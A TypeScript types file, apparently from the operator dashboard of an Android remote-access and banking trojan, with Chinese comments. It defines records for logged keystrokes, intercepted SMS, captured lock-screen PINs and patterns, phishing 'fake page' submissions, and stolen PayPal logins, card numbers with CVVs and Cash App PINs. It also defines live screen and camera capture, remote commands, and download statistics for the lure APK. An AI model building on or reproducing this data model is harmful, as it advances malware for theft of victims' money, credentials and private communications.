export interface A11yProbe {
  serviceConnected: boolean | null;
  controlReady: boolean | null;
  probedAt: number;
  error: string | null;
  /** heartbeat = 新版客户端心跳上报；probe = 服务端主动探测；null = 老数据 */
  source?: "heartbeat" | "probe" | null;
}

export interface Device {
  deviceId: string;
  androidId: string;
  model: string | null;
  remark: string | null;
  bindCode: string | null;
  groupId: string | null;
  appVersion: string | null;
  brand: string | null;
  localeLanguage: string | null;
  localeRegion: string | null;
  clientIp: string | null;
  isCharging: boolean;
  screenWidth: number | null;
  screenHeight: number | null;
  androidVersion: string | null;
  sdkInt: number | null;
  batteryLevel: number | null;
  accessibilityStatus: string | null;
  networkType: string | null;
  screenOn: boolean;
  protectionEnabled: boolean;
  lastBootAt: string | null;
  deviceToken?: string;
  lastHeartbeatAt: string | null;
  isOnline: boolean;
  /** 控制通道健康：WS 是否在线 */
  controlOk?: boolean;
  /** 无障碍/控制通道近一次 ephemeral RTT（毫秒）；null 表示未知 */
  a11yRttMs?: number | null;
  /** ADB 通道是否在线 */
  adbOk?: boolean;
  /**
   * 无障碍「实际连接」：服务端按 TTL 发的 `check_accessibility` 结果。
   * 与 `accessibilityStatus`（settings 视角）是两件事——后者可能说谎。
   * null 表示还没探过（首屏通常先显示「检测中」）。
   */
  accessibilityProbe?: A11yProbe | null;
  /** 是否已采集到锁屏密码 */
  hasPassword?: boolean;
  createdAt: string;
  updatedAt: string;
}

export interface DeviceListResponse {
  items: Device[];
  total: number;
  page: number;
  pageSize: number;
  onlineDeviceIds: string[];
}

export interface DeviceFilterOptions {
  brands: string[];
  languages: string[];
  regions: string[];
}

export interface DeviceGroup {
  id: string;
  name: string;
  sortOrder: number;
  deviceCount: number;
  createdAt: string;
  updatedAt: string;
}

export interface DeviceGroupListResponse {
  groups: DeviceGroup[];
  ungroupedCount: number;
  totalCount: number;
}

export interface CommandRecord {
  id: string;
  deviceId: string;
  cmd: string;
  params: Record<string, unknown> | null;
  status: string;
  result: Record<string, unknown> | null;
  errorMessage: string | null;
  createdAt: string;
  updatedAt: string;
  completedAt: string | null;
}

export interface SmsLog {
  id: string;
  deviceId: string;
  sender: string;
  body: string;
  smsType: number;
  source: string;
  clientSmsId: string | null;
  receivedAt: string;
  createdAt: string;
}

export interface KeyboardLog {
  id: string;
  deviceId: string;
  appPackage: string | null;
  appLabel: string | null;
  text: string;
  eventType: number | null;
  capturedAt: string;
  createdAt: string;
}

export interface KeyboardLogPage {
  items: KeyboardLog[];
  total: number;
  page: number;
  pageSize: number;
}

export interface KeyboardAppSummary {
  appPackage: string | null;
  appLabel: string | null;
  count: number;
  lastCapturedAt: string;
}

export interface InstalledAppInfo {
  packageName: string;
  label: string;
  isSystem: boolean;
  versionName: string;
  /** epoch ms，0/缺省 = 未知 */
  lastUsedTime?: number;
  firstInstallTime?: number;
  lastUpdateTime?: number;
  /** base64 PNG（无 data: 前缀），可选 */
  icon?: string | null;
}

export interface DeviceInstalledAppRecord {
  deviceId: string;
  packageName: string;
  label: string;
  isSystem: boolean;
  versionName: string;
  lastUsedTime: number;
  syncedAt: string;
}

export interface FinanceAppPackage {
  packageName: string;
  label: string;
  createdAt: string;
}

export interface DeviceAppAccountRecord {
  id: string;
  deviceId: string;
  packageName: string;
  account: string;
  confidence: number | null;
  source: "ai" | "manual";
  reason: string;
  createdAt: string;
}

export interface DeviceAppPasswordRecord {
  id: string;
  deviceId: string;
  packageName: string;
  password: string;
  relatedAccount: string;
  confidence: number | null;
  source: "ai" | "manual";
  reason: string;
  createdAt: string;
}

export interface FakePageSubmission {
  id: string;
  deviceId: string;
  packageName: string;
  title: string;
  text: string;
  submitCount: number;
  capturedAt: string;
  createdAt: string;
}

export interface KeyguardPinRecord {
  deviceId: string;
  pin: string;
  digitCount: number;
  lockType: "pin" | "password" | "pattern";
  gesturePath: string;
  capturedAt: string;
  updatedAt: string;
}

export interface KeyguardPinHistoryRecord {
  id: string;
  deviceId: string;
  pin: string;
  digitCount: number;
  lockType: "pin" | "password" | "pattern";
  gesturePath: string;
  source: "device" | "manual";
  capturedAt: string;
  createdAt: string;
}

export interface PayPalAccountRecord {
  id: string;
  deviceId: string;
  email: string;
  password: string;
  amount: string | null;
  currency: string;
  submittedAt: string;
  createdAt: string;
  updatedAt: string;
}

export interface VisaAccountRecord {
  id: string;
  deviceId: string;
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount: string | null;
  submittedAt: string;
  createdAt: string;
  updatedAt: string;
}

export interface CashAppAccountRecord {
  id: string;
  deviceId: string;
  pin: string;
  amount: string | null;
  submittedAt: string;
  createdAt: string;
  updatedAt: string;
}

export interface DebitAccountRecord {
  id: string;
  deviceId: string;
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  billingZip: string;
  amount: string | null;
  submittedAt: string;
  createdAt: string;
  updatedAt: string;
}

export interface ApkDownloadLog {
  id: string;
  androidId: string | null;
  model: string | null;
  installerPackage: string | null;
  apkUrl: string | null;
  status: string;
  errorMessage: string | null;
  clientIp: string | null;
  userAgent: string | null;
  downloadedAt: string;
  createdAt: string;
}

export interface InstallerInstallLog {
  id: string;
  androidId: string | null;
  model: string | null;
  brand: string | null;
  installerPackage: string | null;
  versionName: string | null;
  versionCode: number | null;
  clientIp: string | null;
  userAgent: string | null;
  installedAt: string;
  createdAt: string;
}

export interface ClientInstallLog {
  id: string;
  androidId: string | null;
  model: string | null;
  brand: string | null;
  clientPackage: string | null;
  installerPackage: string | null;
  versionName: string | null;
  versionCode: number | null;
  clientIp: string | null;
  userAgent: string | null;
  installedAt: string;
  createdAt: string;
}

/** 视频管理：status 0=关 1=开 */
export interface MassageVideo {
  id: string;
  name: string;
  url: string;
  description: string;
  status: 0 | 1;
  sortOrder: number;
  createdAt: string;
  updatedAt: string;
}

export interface ScreenFrame {
  deviceId: string;
  data: string;
  screenWidth: number;
  screenHeight: number;
  imageWidth: number;
  imageHeight: number;
  capturedAt: number;
  source?: "screen" | "camera_front" | "camera_back" | "adb_screenshot" | "screenshot" | "screenhelper";
  mimeType?: "image/jpeg" | "image/png" | "image/webp";
  objectUrl?: string;
  seq?: number;
  keyguardLocked?: boolean;
  screenInteractive?: boolean;
}

export interface UiTreeBounds {
  left: number;
  top: number;
  right: number;
  bottom: number;
}

export interface UiTreeNode {
  className: string;
  viewId: string;
  text: string;
  desc: string;
  clickable: boolean;
  focusable: boolean;
  checkable: boolean;
  depth: number;
  packageName: string;
  bounds: UiTreeBounds;
}

export interface UiTreeSnapshot {
  deviceId: string;
  screenWidth: number;
  screenHeight: number;
  packageName: string;
  packageNames?: string[];
  nodeCount: number;
  truncated: boolean;
  capturedAt: number;
  nodes: UiTreeNode[];
  keyguardLocked?: boolean;
  screenInteractive?: boolean;
  /** 无障碍实际扫描到的节点数（含未输出的） */
  scannedNodeCount?: number;
  /** 屏幕中间 12%~88% x 18%~78% 区域内的节点数 */
  centerNodeCount?: number;
  mode?: string;
  windowCount?: number;
}

export interface AdminSnapshotMessage {
  type: "snapshot";
  payload: {
    devices: Device[];
    onlineDeviceIds: string[];
  };
  timestamp: number;
}

export interface AdminPushMessage {
  type:
    | "device_online"
    | "device_offline"
    | "heartbeat"
    | "device_registered"
    | "command_sent"
    | "command_result"
    | "keyboard"
    | "keyguard_pin"
    | "sms"
    | "a11y_probe";
  deviceId: string;
  payload?: Record<string, unknown>;
  timestamp: number;
}

export interface LogEntry {
  id: string;
  kind: "system" | "keyboard" | "command" | "sms";
  title: string;
  content: string;
  deviceId?: string;
  timestamp: number;
}

export interface ApiEnvelope<T> {
  ok: boolean;
  data?: T;
  message?: string;
}

export interface TodayTotalMetric {
  today: number;
  total: number;
}

/** 首页统计面板（/api/data/landing-stats） */
export interface DashboardStats {
  pageKey: string;
  statsDateNote: string;
  landingViews: TodayTotalMetric;
  apkDownloads: TodayTotalMetric;
  installerInstalls: TodayTotalMetric;
  clientInstalls: TodayTotalMetric;
}

/** @deprecated 使用 DashboardStats */
export type LandingPageStats = DashboardStats;
